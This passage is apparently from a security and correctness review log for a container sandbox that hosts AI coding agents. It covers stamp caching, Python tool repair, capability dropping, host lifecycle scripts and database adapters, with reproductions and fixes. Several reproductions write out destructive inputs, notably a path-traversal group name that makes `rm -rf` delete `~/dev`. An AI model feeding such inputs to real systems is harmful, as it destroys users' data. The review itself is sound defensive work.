- Location: `install-agent-skills.sh: \`current_stamp()\`` and `main()`'s `[ "$(cat "$STAMP" 2>/dev/null)" = "$want" ] && exit 0`
- Introduced: before the window (the file was touched in f028ce0)
- What's wrong: the stamp holds only `name=<tool version>`. `AI_AGENTS_ENABLED` is not part of it. The stamp lives in `~/.agents`, which is group-mounted and so shared by every project in the group.
- Failure scenario: project A (claude-code only) starts first in group G and writes `dtctl=0.25.0` to the stamp. Project B in G enables copilot, or A later turns copilot ON. Every later start sees an identical stamp and exits, so `dtctl skills install --for copilot` never runs. Copilot never gets the dtctl/dtmgd skills, silently, until a tool's version changes.
- Evidence: I used a fake `dtctl` that logs its arguments. The first run with `AI_AGENTS_ENABLED=claude-code` logged `--cross-client` and `--for claude`. The second run with `claude-code,copilot` printed nothing and logged no `--for copilot` call.
- Fix direction: include the sorted `AI_AGENTS_ENABLED` set in the stamp. Better still, record a stamp per agent, so a group shared by projects with different agent sets is not reinstalled on every alternation.

### RT-3: installed uv tools die when the image's Python changes, and the presence check never repairs them
- **Status: FIXED (batch 3)** — `ddaf54f` (a dangling `bin/python` behind the entry point triggers `--reinstall`; verified with uv 0.13.5); `tests/test-agent-tools-reconcile.sh`.
- Severity: MEDIUM — Confidence: CONFIRMED (mechanism reproduced with a pyenv-style shim; not run in an image)
- Location: `agent-tools-reconcile.sh: \`install_uv()\`` — `if [[ -x "$UV_TOOL_BIN_DIR/$bin" ]]; then log "$bin already present"; return 0; fi`
- Introduced: 23e6ad6 (before the window). The window adds mkdocs and the fallback on top of it (17f7ca5, 69c3463).
- What's wrong: the first attempt uses the image's Python through pyenv's shims, and uv links the tool venv's `bin/python` to the versioned path behind the shim (`/opt/pyenv/versions/3.15.0/bin/python3`). `~/.ai-tools` outlives the image and is shared by every project in the group. Each build takes pyenv's newest patch release (`Dockerfile: \`sort -V | tail -1\``). So after a `./build.sh --no-cache` that picks up 3.15.1, or in a sibling project whose image was built on another date, that path no longer exists. The entry point in `uv/bin` is still an executable file, so `-x` passes and the reconcile logs "already present" for ever.
- Failure scenario: graphify and mkdocs are installed against 3.15.0. The image is rebuilt and now ships 3.15.1. Running `graphify` gives `bad interpreter: No such file or directory`. On every start the reconcile reports "graphify already present" and `link-agent-tools.sh` links the dead binary.
- Evidence: in my scratch area I ran `uv venv --no-managed-python` with a shim (`exec <dir>/pyv/versions/3.13.0/bin/python3`) first on PATH. `bin/python` became a link to `.../pyv/versions/3.13.0/bin/python3`. After `rm -rf pyv`, `[[ -x tool ]]` was still true, and running the tool failed with `bad interpreter` (rc 126).
- Fix direction: make the presence check prove the tool runs, for example that its venv's `bin/python` resolves or `"$UV_TOOL_BIN_DIR/$bin" --version` succeeds. If it does not, reinstall with `uv tool install --reinstall`, which then goes through the same previous-minor fallback.

### RT-4: the previous-minor fallback reads the PROJECT's Python, not the image's
- **Status: FIXED (batch 3)** — `ddaf54f` (the reconcile runs from `/`).
- Severity: MEDIUM — Confidence: CONFIRMED for `uv python find` (reproduced); PLAUSIBLE for the pyenv-shim effect on the first attempt
- Location: `agent-tools-reconcile.sh: \`py="$(uv python find --no-managed-python 2>/dev/null)"\``
- Introduced: 69c3463 (in the window)
- What's wrong: the reconcile runs in the entrypoint's working directory. That is `-w "$workdir"`, the project primary, and runuser keeps it. `uv python find` honours a `.python-version` and a `.venv` in that directory. `uv tool install` does not; I checked, and it ignores `.python-version`. So the two disagree. AGENTS.md says the retry version is "computed from the image's".
- Failure scenarios:
  - (a) The project has `.python-version` = `3.12`, which is very common, and the image only has 3.15. `uv python find` fails with "No interpreter found for Python 3.12", `major` stays empty, no retry happens, and graphify/mkdocs fail. This is exactly the wheel-lag case the fallback exists for.
  - (b) The project has a `.venv` on 3.13. The probe returns `.venv/bin/python`, and the retry runs on 3.12 instead of 3.14.
  - (c) Plausible: pyenv's `python3` shim also honours that `.python-version`. With a version pyenv lacks, the shim errors, and the first attempt's discovery skips past it, possibly to Ubuntu's own `/usr/bin/python3`, or to nothing.
- Evidence: in a scratch dir holding a `.venv`, `uv python find --no-managed-python` printed `<dir>/.venv/bin/python`. With `.python-version`=3.11 it printed `error: No interpreter found for Python 3.11 ...` (rc 2). `(cd / && uv python find --no-managed-python)` printed `/usr/bin/python3`. The hermetic test's fake `uv` ignores the cwd, so it cannot see this.
- Fix direction: `cd /` (not `$HOME`, which in the host group may hold its own pin) at the top of agent-tools-reconcile.sh, or at least around the probe and the uv calls.

### RT-5: the leftover-npm-Claude fallback cannot fire in any named group, and its test models a state that cannot occur
- **Status: FIXED (batch 3)** — `16266d7`, aligned with `install_claude_native` in `ce33ed9` (the highest version must be executable); the test now makes the mounted directories.
- Severity: LOW — Confidence: CONFIRMED (from code)
- Location: `agent-tools-reconcile.sh: \`! -d "$HOME/.local/share/claude" && -x "$npm_bin/claude"\``; `sandbox.sh: \`"$group_root/.local/share/claude" "$group_root/.local/state/claude"\`` (`install -d`, then mounted)
- Introduced: 2354abc (before the window). 33c2b44 in the window edited the condition.
- What's wrong: for every non-host group with claude-code ON, sandbox.sh creates and mounts `~/.local/share/claude`. So `! -d` is always false in the container, even when the native install failed. `~/.local/bin/claude` is then never pointed at the leftover npm copy, although the comment says "Claude Code plugins expect ~/.local/bin/claude". `/usr/local/bin/claude` still works through `link-agent-tools.sh`'s own fallback.
- Failure scenario: an old group carries npm Claude, and the native install fails (offline, or claude.ai unreachable). There is no `~/.local/bin/claude`, and plugins and hooks that call that path fail. `tests/test-agent-tools-reconcile.sh`'s "leftover npm claude is used" case passes only because it never creates the mounted directory that sandbox.sh always creates.
- Fix direction: key the condition on "no executable version under `~/.local/share/claude/versions`", the same predicate `install_claude_native` uses, and pre-create the directory in the test.

### RT-6: Copilot and Gemini run under whichever node is active, so `nvm use 20` can break them
- **Status: FIXED (batch 3)** — `77f265e` (a wrapper runs each npm node-script CLI under the default node; `PATH` untouched), bounded read and no `timeout(1)` dependency in `ce33ed9`/`59a7690`; `tests/test-link-agent-tools.sh`.
- Severity: LOW — Confidence: PLAUSIBLE (based on the upstream `engines` minimums; not run)
- Location: `link-agent-tools.sh: \`"copilot:copilot:$home_root/npm/bin/copilot"\`` (a plain symlink to npm's `#!/usr/bin/env node` launcher)
- Introduced: 23e6ad6 / 33c2b44
- What's wrong: 259aeb7 in the window fixed this class for qmd: it pins qmd to the default node because `nvm use 20` cannot run it. The npm-installed agent CLIs were left as plain symlinks. Copilot CLI requires Node 22 or later.
- Failure scenario: a project with `node=20` runs `nvm use 20` in its shell, then `copilot`. It runs on node 20 and refuses to start, or crashes.
- Fix direction: write a wrapper for the npm agent CLIs that runs them under the node they were installed with, the same way link-node-globals.sh `--pin` does for qmd.

### RT-7: updating Codex/Gemini on every start rewrites a package that sibling containers may be running
- **Status: FIXED (batch 3)** — `6836894` (reinstalled only when `npm view` differs from `npm ls`; an unreachable registry keeps the installed copy; parsing verified with npm 10).
- Severity: LOW — Confidence: PLAUSIBLE
- Location: `agent-tools-reconcile.sh: \`update_npm()\``
- What's wrong: flock serialises only the reconcile scripts, not the tools themselves. The leftover-Claude comment refuses to delete the npm copy because "other containers in the same group may be running against it right now". Yet `npm install -g --prefix ~/.ai-tools/npm @google/gemini-cli` re-extracts the package in place on every start of any container in the group.
- Failure scenario: Gemini is running in container A. Container B in the same group starts and replaces `lib/node_modules/@google/gemini-cli`, and a module A's node process loads lazily mid-replacement is missing or a different version.
- Fix direction: skip the reinstall when the installed version already equals `npm view <pkg> version`, which also saves the ~7 s per start. Otherwise accept the risk and document it.


### RT-8: The user-level steps before the capability drop can leave a process with the full bounding set
- **Status: FIXED** (2026-10-28). Every user-level step before the final `capsh` starts through `setpriv --bounding-set=-net_admin,-net_raw --no-new-privs --` in front of its `runuser`: `entrypoint.sh: as_sandbox_user()` (the skill installs, both reconciles, the git config), the services `start` in `run_services()`, and `link-default-ruby.sh: probe()`. Root drops the two capabilities from the bounding set, then `runuser` switches user as before, so its environment handling is unchanged. Measured in ubuntu:24.04 run with `--cap-add NET_ADMIN --cap-add NET_RAW`: `runuser` alone gives `CapBnd: a80435fb, NoNewPrivs: 0`; through `setpriv`, `a80405fb` (bits 12 and 13 gone) and `NoNewPrivs: 1`, `runuser` and its PAM session work under it, and a `setsid` child keeps the reduced set. Hermetic: `tests/test-entrypoint-wiring.sh` runs `as_sandbox_user` and the services start with a recording `setpriv`, `tests/test-ruby-wrapper.sh` the probes; each red on the old code. The integration corpus runs the real entrypoint through these steps in every mode.
- Severity: LOW. Confidence: CONFIRMED that the process survives; no route to root found in the ubuntu:24.04 base (its setuid binaries need a password; root's is locked). The full image's `dumpcap` file capabilities were not checked.
- Location: entrypoint.sh: `as_sandbox_user()`; link-default-ruby.sh: `probe()`.
- What's wrong: these steps run as the sandbox user via `runuser`, before `exec capsh` removes NET_ADMIN/NET_RAW from the bounding set. A `setsid` daemon forked there escapes `timeout` and keeps that bounding set into the session. A setuid-root or file-capability binary would then grant the capabilities back.
- Fix direction: run every user-level step before the drop through `setpriv --no-new-privs --bounding-set -net_admin,-net_raw` (or `capsh --drop=… --user=…`), so nothing started there can regain them.

### RT-9: Nits left by the batch 3 reviews
- **Status: PARTLY FIXED** (2026-10-28). Fixed: the skills stamp is read, the skills installed and the stamp rewritten under an `flock` on `~/.agents/.ai-containers-skills.lock` (`install-agent-skills.sh: take_lock()`), bounded so it never holds up a start — no `flock`, a lock path that is a link or not a regular file (a FIFO would block the open), or a holder past 60 s means installing unlocked with a `NOTE:` — and the tools it runs do not inherit the lock's descriptor. Its review found the first version unbounded and silent (an agent holding the lock, or a FIFO at its path, hung every later start of the group), sending all later stderr to `/dev/null`, and its tests failing on a Mac (no `flock`) and timing the wait in whole seconds. `tests/test-agent-skills.sh` now has the holder mark when it holds and releases the lock and requires the installer to finish after the release and say it waited; a holder past the wait (`AI_CONTAINERS_SKILLS_LOCK_WAIT=1`) and a FIFO at the lock path must not hold the start; each red on the old code every time, and each with its own guard removed. The two-projects-together check is a race on the old code (red about one run in three). Without `flock` they print a SKIP. The test gaps are closed: `tests/test-ruby-wrapper.sh` runs the non-root, no-probe-user branch of `probe()` and requires both of a probe's outcomes (a broken binstub repaired, a working one kept), red with that branch made to fail; the working-binstub case now has a wrapper for it to refuse; `tests/test-link-agent-tools.sh` gives `node_script` a shebang whose `node` lies past byte 256 (red with an unbounded read) and an executable FIFO where the script should be, under `p_timeout` and required to take under 3 s (red without the regular-file test: `node_script`'s own timeout took 5 s). Left open: `ln -sfT` — BSD `ln` has no `-T`, and the hermetic suite runs these link scripts on the host, macOS included; and the NUL-in-shebang nit, harmless.
- Severity: NIT
- The skills stamp is rewritten without a lock: two containers of a group starting together can lose each other's lines, which costs one harmless reinstall.
- `ln -sfn` still makes the link inside a real directory standing at `/usr/local/bin/<name>`. Only root could make one and nothing does; `ln -sfT` would close it.
- Stripping NULs from the shebang read makes `#!\0/usr/bin/node` count as a node script; harmless, the wrapper runs as the user.
- Test gaps: the non-root, no-probe-user branch of `probe()` is no longer exercised; no case checks that a binstub that runs stays a direct link when a wrapper for it exists (pre-existing); no case covers the bounded read in `node_script` (FIFO, oversize file).

## 4. Host lifecycle scripts

### PRJ-1: `group.sh rm` never validates the group name, so `rm -rf` reaches outside `~/.ai-containers`
- **Status: FIXED (batch 4)** — `c548b0e` (`validate_group_name` before any path); `tests/test-group-lifecycle.sh`.
- Severity: MEDIUM — Confidence: CONFIRMED
- Location: `group.sh: \`cmd_rm()\`` (`local dir="$groups_root/$name"` … `rm -rf "$dir"`)
- Introduced: pre-window (group.sh creation). The window touched group.sh through sandbox-common (c029d8a).
- What's wrong: every other entry point runs `validate_group_name` (`^[a-z0-9][a-z0-9-]{0,31}$`), but `cmd_rm` only refuses `host` and the empty string. The name is spliced into a path and handed to `rm -rf`, so a name containing `/` or `..` leaves `~/.ai-containers`. The rvm volume name is sanitised separately (`/`→`_`), so even for a near-valid name like `default/` the directory and the volume no longer refer to the same group: the directory is removed and the group's rvm volume is orphaned.
- Failure scenario: `./group.sh rm ../dev --yes` runs `rm -rf ~/.ai-containers/../dev`, which deletes `~/dev`. Without `--yes` the user gets one `[y/N]` prompt showing an unnormalised path (`…/.ai-containers/../dev`). The only safety is that `rm` itself refuses a path whose last component is `.` or `..`.
- Evidence: reproduced with a fake HOME: `HOME=$S/home bash group.sh rm ../victim --yes` printed `Removed directory …/home/.ai-containers/../victim`, and `$S/home/victim` (with its data) was gone.
- Fix direction: call `validate_group_name "$name"` (or `valid_group_name`, which returns instead of exiting) at the top of `cmd_rm`, before any path is built.

### PRJ-2: Sync re-enables a component the project turned off by commenting it out, as sandbox.conf tells users to do
- **Status: FIXED (batch 4)** — `a3ff97a` (a `#key=` / `# key=` line counts as the project's; an indented example does not); `tests/test-sandbox-schema.sh`.
- **Duplicate of DOC-1** — two reviewers found it independently; fix once (batch 4).
- Severity: MEDIUM — Confidence: CONFIRMED
- Location: `sync-to-projects.sh: \`reconcile_sandbox_conf()\`` (`grep -qE "^${key}=" "$project" 2>/dev/null || added+=("$key")`)
- Introduced: pre-window reconcile design (24e093a era). 0c7a870 in the window reworked the same append path.
- What's wrong: the header of sandbox.conf says "Boolean components: set to ON to include, OFF (or comment out) to exclude." The reconcile decides that a key is missing when no line starts with `key=`. A commented-out `#copilot=ON` therefore counts as missing, and the key is appended with the upstream default. Upstream ships `copilot=ON`, `claude-code=ON`, `github-cli=ON` and `bun=ON`.
- Failure scenario: a project disables Copilot the documented way (`#copilot=ON`). The next `./sync-to-projects.sh` appends `copilot=ON` under "New options synced from upstream". The next build installs Copilot again, adds its allowlist fragment (`github-copilot.txt`) to the restricted-mode allowlist, and mounts `~/.copilot`. The only output is a one-line "appended 2 new key(s)" message.
- Evidence: reproduced: a project sandbox.conf with `#copilot=ON` and `# claude-code=ON`, then `bash sync-to-projects.sh $P` → `Reconciled sandbox.conf: appended 2 new key(s): copilot claude-code`, and the file now ends with `copilot=ON` and `claude-code=ON`.
- Fix direction: treat a commented `^#[[:space:]]*key=` line as "the project has this key" and do not append it, or write OFF for it. Separately, drop "or comment out" from the sandbox.conf header.

### PRJ-3: Re-running project-init.sh silently resets `SANDBOX_MODE` (restricted → open) and `SANDBOX_WORKDIR`, with no backup
- **Status: FIXED (batch 4)** — `1e25ddf` (keeps `SANDBOX_MODE` and added keys, backs up `sandbox.env`), `2ee809b` (a non-portable `SANDBOX_WORKDIR` is dropped with a NOTE rather than moved into `sandbox.local.env`: the automated security review of `1e25ddf` flagged that as laundering committed config into trusted config), `b681c97` (lines matched as the loader reads them); `tests/test-project-init.sh`.
- Severity: MEDIUM — Confidence: CONFIRMED
- Location: `project-init.sh: \`SANDBOX_MODE=open\`` in the unconditional `} > "${dest}/sandbox.env"` heredoc. The comment beside it reads `unlike sandbox.env (whose values are all re-prompted)`.
- Introduced: 8555b1d / 3853c17 (pre-window). project-init.sh was touched in the window (9e67226, aeb218a, f8414ab).
- What's wrong: on re-init, sandbox.env is overwritten unconditionally. `SANDBOX_MODE` and `SANDBOX_WORKDIR` are never prompted; they are hardcoded to `open` and `..`. Any other key a user added (`PREVIEW_PORTS`, `SELINUX_LABEL`, `CONTAINER_NOFILE`, …) is also dropped. sandbox.local.env gets a `.pre-init` backup for exactly this reason, but sandbox.env gets none, so the code comment's justification is false. In the default layout `.ai-containers/` is gitignored, so `git status` shows nothing either.
- Failure scenario: a project's sandbox.env has `SANDBOX_MODE=restricted` and `SANDBOX_WORKDIR=@app`. The user re-runs `project-init.sh` and accepts every default (for example, to pick a different group). The next `./runme.sh` launches in **open** mode: unrestricted egress and no firewall, with the primary mount changed. Nothing reports the change.
- Evidence: reproduced: piped answers into a re-init of a project whose sandbox.env held `SANDBOX_MODE=restricted`, `SANDBOX_WORKDIR=@app` and `SELINUX_LABEL=keep`. Afterwards the file held `SANDBOX_MODE=open` and `SANDBOX_WORKDIR=..`, `SELINUX_LABEL` was gone, and no backup existed.
- Fix direction: when sandbox.env already exists, keep its existing `SANDBOX_MODE`/`SANDBOX_WORKDIR`, offer them as prompt defaults, and carry unknown keys forward. At minimum, back it up as is done for sandbox.local.env.

### PRJ-4: project-init.sh adds `/.ai-containers/` to `.gitignore` even in a project that tracks `.ai-containers/`
- **Status: FIXED (batch 4)** — `b0d18f6` (init has sync's tracked-layout check; a test compares the two copies).
- Severity: LOW — Confidence: CONFIRMED
- Location: `project-init.sh: \`ensure_ai_containers_ignored()\``. Compare with the same-named function in sync-to-projects.sh, which has `git -C "$project_path" ls-files -- .ai-containers`.
- Introduced: 78a6175 added the tracked-layout guard to sync only (pre-window).
- What's wrong: the two copies of the function have drifted. Sync never adds the ignore rule when any file under `.ai-containers/` is tracked; init still does. In a project that deliberately versions its `.ai-containers/` (the layout AGENTS.md documents: "Remove the line to version the portable config"), re-running init adds the rule back. Every file that is not yet tracked is then hidden from `git add`, which is what the sync-side guard exists to prevent.
- Evidence: reproduced: a git project with `.ai-containers/sandbox.env` committed, then re-init. `git status` showed `?? .gitignore` containing `/.ai-containers/`.
- Fix direction: keep one copy of the function, with the `ls-files` guard, in a sourced file, or add the guard to project-init's copy.

### PRJ-5: Repo/rvm volume discovery uses unanchored Docker `name=` filters; `rm`, `reset` and `gc` delete volumes belonging to other repos or prefixes
- **Status: FIXED (batch 4)** — `ecc4893` (exact prefix match in bash, base/working copy by label, `--` refused in new names); the review of batch 4 found it took any unclassifiable volume for a working copy, so `gc` deleted a base volume under a nested prefix — classified positively in `b681c97`. `tests/test-repo-destructive.sh`; mutation 620 regenerated.
- Severity: MEDIUM — Confidence: CONFIRMED
- Location: `sandbox-common.sh: \`repo_workcopy_volumes()\``, `sandbox-common.sh: \`repo_base_volumes()\``, `sandbox-common.sh: \`rvm_volumes()\``, `repo.sh: \`cmd_rm()\`` / `repo.sh: \`reset_one()\`` (`docker volume ls --quiet --filter "name=${vol}--wc-"`)
- Introduced: pre-window (label/registry design). These paths are called by the window's reset/rm code.
- What's wrong: Docker's volume `name=` filter is an unanchored regex. There are two consequences.
  - (a) `validate_repo_name` allows `--`, so a repo named `app--wc-ui` has the base volume `ai-containers-repo-app--wc-ui`. That volume matches the working-copy filter for repo `app`. `repo.sh rm app`, `repo.sh reset app` (which removes working copies without listing them in the prompt) and `repo.sh gc` all delete it as if it were a working copy. `repo_base_volumes` also hides it from `list`/`reindex` (`grep -v -- '--wc-'`).
  - (b) With `REPO_VOLUME_PREFIX`, which the docs suggest setting to `$IMAGE_NAME`, the prefix `prj` matches `myprj-repo-*`. `gc` under one prefix therefore deletes another prefix's working copies, and `list`/`reindex` adopt another prefix's base volumes. A prefix containing `.` (which sanitising allows) matches any character. `rvm_volumes` has the same shape, and `group.sh gc` deletes what it finds.
- Failure scenario: `REPO_VOLUME_PREFIX=prj ./repo.sh gc --yes` removed `myprj-repo-lib--wc-t`, a working copy that "may hold UNCOMMITTED work" belonging to the other prefix. `./repo.sh rm app --yes` removed the base volume of the separately registered repo `app--wc-ui`, which `list` then reported as MISSING.
- Evidence: reproduced both against the real daemon (Docker 29.7.2) using scratch volumes, which were removed afterwards.
- Fix direction: anchor the filters (`name=^${prefix}-repo-`, `name=^${vol}--wc-`), then confirm each result by its labels or an exact prefix match in bash. Forbid `--` in repo names, or use a working-copy separator that `validate_repo_name` cannot produce.

### PRJ-6: ai-containers-report.sh reads the LAST value of a key, but the launcher uses the FIRST, so the network mode can be misreported
- **Status: FIXED (batch 4)** — `0940160` (first value, literal values, `UNSET (usage)`), group column in `b681c97`; `tests/test-report.sh`. Two edge cases remain in REPO-12.
- Severity: LOW — Confidence: CONFIRMED
- Location: `ai-containers-report.sh: \`env_var()\`` (`END { if (val != "") print val }`, last match wins) vs `sandbox-common.sh: \`load_env_defaults()\`` (`[[ -n "${!key+x}" ]] && continue`, first match wins within a file)
- Introduced: pre-window. AGENTS.md says the report resolves "the same precedence sandbox-common.sh applies".
- What's wrong: when a key appears twice in sandbox.env, the report and the launcher disagree. The natural way to override `SANDBOX_MODE=open`, which project-init writes, is to append a line, and that triggers it. The report also strips a trailing `# comment` and single quotes, which the launcher treats as part of the value. It also labels an unset mode `DEFAULT-OPEN`, but sandbox.sh falls back to `usage` (`command="${1:-${SANDBOX_MODE:-usage}}"`) and does not launch at all.
- Failure scenario: sandbox.env contains `SANDBOX_MODE=open` and later `SANDBOX_MODE=restricted`. The report shows `RESTRICTED`; the launcher runs **open**.
- Evidence: reproduced: the report printed `RESTRICTED`, and the same file loaded through `load_env_defaults` gave `SANDBOX_MODE=open`.
- Fix direction: make `env_var` keep the first match and the same literal value semantics as `load_env_defaults`, and replace `DEFAULT-OPEN` with something like `UNSET (usage)`.

### PRJ-7: The `repo.sh gc` tests fail under glibc `en_US.UTF-8`; this is a test bug, not a product bug
- **Status: FIXED (batch 7)** — with TST-1: `142dc84`, and `aa0c70b` for the second sort in the same file.
- **Duplicate of TST-1** (which also covers the second affected test, `tests/test-falsify-run.sh`); fix once (batch 7).
- Severity: LOW — Confidence: CONFIRMED
- Location: `tests/test-repo-destructive.sh: \`removed() { sed -n 's/^volume rm //p' "$DOCKER_LOG" | tr ' ' '\n' | grep -v '^--' | sort | tr '\n' '|'; }\``
- What's wrong: the helper sorts with the caller's locale, but the expected strings are hand-written in byte (C) order. glibc's en_US.UTF-8 ignores punctuation at the primary level, so `docs-archive--wc-projA` sorts before `docs--wc-projA`. The product does not depend on order: gc removes in docker's listing order, and the report and list sorts use `LC_ALL=C`. All other tests in this area pass under en_US.UTF-8.
- Evidence: `LC_ALL=en_US.UTF-8 bash tests/test-repo-destructive.sh` → rc=2, `FAIL: gc --yes removes every working copy…` and `FAIL: gc --unused keeps the in-use copy…`. Under C.UTF-8 it passes.
- Fix direction: `LC_ALL=C sort` in `removed()`, and in the `sort -u` near the end of the same file.

### PRJ-8: Migration 002 writes a major-only `openjdk=21`, which build.sh then refuses
- **Status: FIXED (batch 4)** — `3349604` (the value is kept, so `build.sh` still refuses it, but the hook now writes a comment and prints a NOTE saying what to complete).
- Severity: LOW — Confidence: CONFIRMED (from code)
- Location: `migrations/002-openjdk-single-key.sh: \`printf 'openjdk=%s\n' "$merged"\`` vs `build.sh` (`looks like a major version only`)
- Introduced: 24e093a (pre-window).
- What's wrong: `openjdk-21=ON` is migrated to `openjdk=21`. build.sh's validate_config rejects any SDKMAN version without a `.`, so the first build after a sync fails. The error is clear but the migration itself caused it. Old code, and it only affects projects that predate the openjdk split.
- Fix direction: have the hook map each major to a full identifier or emit an empty value plus a comment, or have it print a notice that the value must be completed.

### PRJ-9: Timestamped `*.pre-migrate.<ts>` backups are not gitignored
- **Status: FIXED (batch 4)** — `0213e86` (`*.pre-migrate.*` in init's and sync's patterns).
- Severity: LOW — Confidence: CONFIRMED (from code)
- Location: `migrate-runme.sh: \`bk="${f}.pre-migrate.$(date -u +%Y%m%dT%H%M%SZ)"\`` vs the ignore pattern `'*.pre-migrate'` in project-init.sh and `sync-to-projects.sh: \`ensure_inner_gitignore()\``
- What's wrong: the `.pre-init` backups have a wildcard pattern (`sandbox.local.env.pre-init*`); the second-generation `.pre-migrate.<ts>` backups do not. Those backups include `sandbox.local.env.pre-migrate.<ts>` (this machine's absolute mount paths) and the old fat runme.sh. In a project that tracks `.ai-containers/`, they show up as committable.
- Fix direction: add `*.pre-migrate.*` (or change the pattern to `*.pre-migrate*`) in both places.


## 5. In-container DB services

### SVC-1: The MySQL/MariaDB admin client obeys the app's `MYSQL_HOST` / `MYSQL_TCP_PORT` / `MYSQL_PWD` from container.env, so the start fails or the admin SQL goes to another server
- **Status: FIXED (batch 5)** — `657cb29`. The admin client runs without the app's `MYSQL_*`/`LIBMYSQL_*` (`services.d/mysql.sh: _mysql_client()`, used by MariaDB's readiness probe too) or `PG*` variables (`services.d/postgres.sh: _pg_sql()`). Not `--protocol=SOCKET`: measured, with `MYSQL_HOST` set MySQL 8.0 refuses it (`ERROR 2047 Wrong or unknown protocol`) and MariaDB 10.11 ignores it. Redis left as it is: with `REDISCLI_AUTH` set, `redis-cli` prints the AUTH error and `INFO` still answers (rc 0), so readiness is unaffected. Tests: mysql D15, mariadb D12, postgres D22.
- Severity: MEDIUM — Confidence: CONFIRMED (client behaviour reproduced; the adapter consequence follows from the code)
- Location: `services.d/mysql.sh: _mysql_sql()` (`"$MYSQL_CLIENT" --no-defaults -uroot --socket="$(_mysql_sock)" -e "$1"`), `services.d/mariadb.sh: _mariadb_pid_file()` (same flags)
- Introduced: bc86420 (mysql), b058bed (mariadb)
- What's wrong: The adapters keep their own knobs under `AI_SERVICES_MYSQL_*` / `AI_SERVICES_MARIADB_*` so that the app's variables cannot move the server (AGENTS.md; mutations 794/813 test `MYSQL_PORT`). The clients the adapters run, though, read the environment themselves, and `start` gets all of container.env. `--no-defaults` turns off option files only, not environment variables. The client calls pass `--socket` but no `-h`/`--protocol`, so a `MYSQL_HOST` in the environment switches the connection to TCP to that host, ignoring `--socket`. `MYSQL_TCP_PORT` then picks the port, and `MYSQL_PWD` sends a password that root, which has none, rejects.
- Failure scenario: a `container.env` copied from a docker-compose setup with `MYSQL_HOST=db`, or the leftover `MYSQL_HOST=host.docker.internal` that docs/components/mysql.md itself anticipates ("Moving from a database on the host?"):
  - mysql: `mysqld --daemonize` succeeds, then `_mysql_create_self` fails (`ERROR 2005 Unknown MySQL server host 'db'`), so `svc_start` returns 1. The runner prints "mysql failed to start", but the server is in fact running, and `MYSQL_USERS`/`MYSQL_DATABASES` are never provisioned.
  - mariadb: `_mariadb_pid_file` never matches, so the loop spins for the full 30 s and then reports "mariadbd did not answer". The server keeps running anyway (nothing kills it on that path).
  - In open/discovery mode with `MYSQL_HOST=host.docker.internal`, `CREATE USER … GRANT ALL … WITH GRANT OPTION` and `ALTER USER 'root'@'localhost' IDENTIFIED BY …` are sent to the host's real MySQL as root. They succeed only if that root takes TCP logins with no password, which is unlikely but the wrong target either way.
- Evidence (in `ubuntu:24.04` with `mysql-client-core-8.0`, and again with `mariadb-client-core`):
  ```
  mysql --no-defaults -uroot --socket=/tmp/x.sock -e "select 1"                  → ERROR 2002 Can't connect … through socket '/tmp/x.sock'
  MYSQL_HOST=db mysql --no-defaults -uroot --socket=/tmp/x.sock …                 → ERROR 2005 Unknown MySQL server host 'db'
  MYSQL_HOST=127.0.0.1 MYSQL_TCP_PORT=3307 mysql --no-defaults -uroot --socket=…  → ERROR 2003 Can't connect to MySQL server on '127.0.0.1:3307'
  MYSQL_HOST=db mariadb --no-defaults -uroot --socket=/tmp/x.sock -N -B -e …      → ERROR 2005 Unknown server host 'db'
  ```
- The same class, not reproduced, lower likelihood:
  - `REDISCLI_AUTH` makes `redis-cli` in `services.d/redis.sh: _redis_info_pid()` send AUTH to a server with no password. Redis 7 refuses that, so readiness never passes and the start fails after 30 s.
  - `PGHOSTADDR` overrides psql's `-h <socket dir>` in `_pg_sql()` and connects over TCP to that address.
- Fix direction: run the adapters' client calls under `env -u MYSQL_HOST -u MYSQL_TCP_PORT -u MYSQL_PWD -u MYSQL_UNIX_PORT` and add `--protocol=SOCKET`. Do the same for `REDISCLI_AUTH` (redis-cli) and `PGHOSTADDR`/`PGSERVICE` (psql). Add a hermetic test that sets `MYSQL_HOST` and checks that the fake client's argv/env still targets the socket.

### SVC-2: On an x86-64 CPU without AVX, mongo is reported as "this image has no mongo server. Rebuild", not as a start failure with the log
- **Status: FIXED (batch 5, hermetic half)** — `657cb29`, `a49e562`. A `mongod` that cannot run reads as `unknown`, and its start fails before the server is launched, logging the exit status, the signal and the AVX hint; the adapter contract in AGENTS.md allows `unknown`. Test: mongo D10 (a fake that dies of SIGILL). Confirmation on real non-AVX hardware is still PLAT-4.
- Confirmation needs non-AVX hardware: tracked as PLAT-4 in [2026-10-26-platform-issues.md](2026-10-26-platform-issues.md). The hermetic half of the fix can be done in batch 5.
- Severity: LOW — Confidence: PLAUSIBLE (not reproduced; needs a non-AVX CPU, e.g. a Proxmox/KVM guest with the `kvm64` CPU type)
- Location: `services.d/mongo.sh: svc_installed_version()` (`"$MONGO_MONGOD" --version 2>/dev/null | sed -n …`), together with `start-services.sh: start_one()` (`warn "sandbox.conf has $name=$value, but this image has no $name server. Rebuild: ./build.sh"`)
- Introduced: e3c9b15
- What's wrong: docs/components/mongo.md says: "a CPU or an emulator without it stops `mongod` with `Illegal instruction`, and the start says it failed, with the log." MongoDB ≥5.0's x86-64 binaries die with SIGILL during early start-up, and that includes `mongod --version`. The version probe therefore prints nothing, and the runner takes an empty version to mean "not installed".
- Failure scenario: `mongo=ON`, the image is built and run on a non-AVX host. The user sees the "Rebuild: ./build.sh" warning, rebuilds, and gets the same warning. No log is written and no SIGILL is mentioned anywhere.
- Fix direction: decide "installed" by `[[ -x "$MONGO_MONGOD" ]]`, and if the version probe then fails, report it (for example "mongod exists but cannot run: exit 132 (Illegal instruction — needs AVX)"). Alternatively, correct the doc.

### SVC-3: Empty entries in `POSTGRES_ROLES` / `POSTGRES_DATABASES` warn about `''`
- **Status: FIXED (batch 5)** — `657cb29`. Empty entries are skipped quietly; `:owner` is still warned about. Test: postgres D23; D8 no longer counts the empty entry.
- Severity: LOW — Confidence: CONFIRMED (reproduced)
- Location: `services.d/postgres.sh: svc_provision()`. Neither loop has an empty-entry skip; mysql.sh has `[[ -n "$entry" ]] || continue`.
- Introduced: d337c61 / d7cdb75
- What's wrong: `a,,b`, or a trailing `, ` (the `IFS=, read -ra` split keeps a whitespace-only last field), produces an empty name, which then fails the regex and is warned about. The MySQL adapter skips empties silently, and so does the runner's own `each_service` for `AI_SERVICES`.
- Evidence: `POSTGRES_ROLES='app_user,,other' POSTGRES_DATABASES='db1, '` against the adapter with a fake psql printed:
  ```
  WARNING: POSTGRES_ROLES: '' is not a valid role name (lowercase letters, digits, _) — skipped
